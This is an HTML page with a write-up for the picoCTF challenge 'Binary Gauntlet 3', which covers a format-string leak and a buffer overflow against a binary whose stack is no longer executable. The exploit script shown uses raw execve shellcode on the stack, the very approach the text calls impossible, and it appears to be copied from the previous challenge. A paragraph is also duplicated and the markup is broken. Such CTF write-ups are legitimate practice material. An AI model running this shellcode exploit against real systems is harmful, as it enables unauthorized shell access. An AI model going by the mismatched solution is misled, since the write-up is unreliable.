<div class="page-header">
    <div class="page-header-inner">
        <div class="page-header-inner2">
            <h1>Binary Gauntlet 3 Writeup</h1>
        </div>
    </div>
</div>
<div class="paragraph">
	<H4>Problem</H4>
    <p>
		<br><br>
        The stack is no longer executable. <a href=../../docs/pico/gauntlet_3>gauntlet</a> nc mercury.picoctf.net 22595
    	<br>
    </p>
</div>

<div class="paragraph">
	<H4>Solution</H4>
    <p>
    	<br><br>
    	This challenge gives us a binary to download and develop the exploit for locally, and then an address to connect to and retrieve the flag from using the developed exploit.
        <br>
    	We start off by running Ghidra on the binary to view the disassembly and get an idea as to what's going on. 
    	<br><br>
    </p>
</div>
<div>
    <img src="../imgs/pico/chall4_1.png" alt="">
</div>
<div class="paragraph">
    <p>
        <br>
        This challenge appears to be almost the exact same as Binary Gauntlet 2. Once again we have a format string vulnerability to leak out an address of the stack, and can then overflow the buffer and point the return address to the leaked address. The only difference this time however is that as the problem mentions, the stack is no longer executable. So we will not be able to work with shellcode anymore, and need to spawn a shell through different manners. We can verify the existence of nx using checksec.
        <br>
    </p>
</div>
<div>
    <img src="../imgs/pico/chall4_2.png" alt="">
</div>
<div class="paragraph">
    <p>
        <br><br>
        Testing different inputs similarly to how we did for Binary Gauntlet 0, we see a couple of different values. 
    </p>
</div>
<div>
    <img src="../imgs/pico/chall4_3.png" alt="">
</div>
<div>
    <img src="../imgs/pico/chall4_4.png" alt="">
</div>
<div class="paragraph">
    <p>
        <br><br>
        After testing out the values that look like they might be a libc address, we find success with 0x7ffff7de50b3. This is the address of __libc_start_main+243. When we now calculate its offset from the libc base, and subtract another 243 off of it, we find a fitting libc for the binary on libc.rip. We download the first listed libc to start working on our exploit.
    </p>
</div>
<div>
    <img src="../imgs/pico/chall4_5.png" alt="">
</div>
div class="paragraph">
    <p>
        <br><br>
        After testing out the values that look like they might be a libc address, we find success with 0x7ffff7de50b3. This is the address of __libc_start_main+243. When we now calculate its offset from the libc base, and subtract another 243 off of it, we find a fitting libc for the binary on libc.rip. We download the first listed libc to start working on our exploit.
    </p>
</div>
<div>
    <style 
        type="text/css">
            pre code {
                      background-color: #008080;
                      border: 1px solid #999;
                      display: block;
                      padding: 15px;
                      color:  #F5F5DC;
                    }
    </style>
    <pre>
        <code>
#!/usr/bin/env python
from pwn import *
p = remote('mercury.picoctf.net', 49704)
#p = process('./gauntlet_2')

payload = b"\x90"*70
payload += b"\x31\xF6\x31\xD2\x48\xBB\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x56\x53\x48\x89\xE7\x6A\x3B\x58\x0F\x05"
payload = payload.ljust(120,b'A')

p.sendline('%6$p')
data = p.clean().decode('latin-1')
leak = int(data,16) - 330
payload += p64(leak)

p.sendline(payload)
p.interactive()
        </code>
    </pre>
</div>
<div>
    <p>
        <br>
        After running the exploit, we spawn a shell and can read the flag.
        <br><br>
    </p>

</div>
<div>
    <img src="../imgs/pico/chall3_4.png" alt="">
</div>
<script>try {pageOpenedDirectly;} catch(e) {var loc = window.location.pathname;var dir = loc.substring(0, loc.lastIndexOf('/'));dir = dir.split("/")[dir.split("/").length-1];let currentLoc = location.href;let currentFile = location.href.split("/").slice(-1);currentLoc = currentLoc.replace(currentFile,"");currentLoc = currentLoc.replace(dir,"");currentLoc = currentLoc.slice(0, -1);if (currentFile[0].indexOf(".html") !== -1) currentFile = currentFile[0].slice(0, -5);window.location = currentLoc+"?p="+currentFile+"&d="+dir;}</script>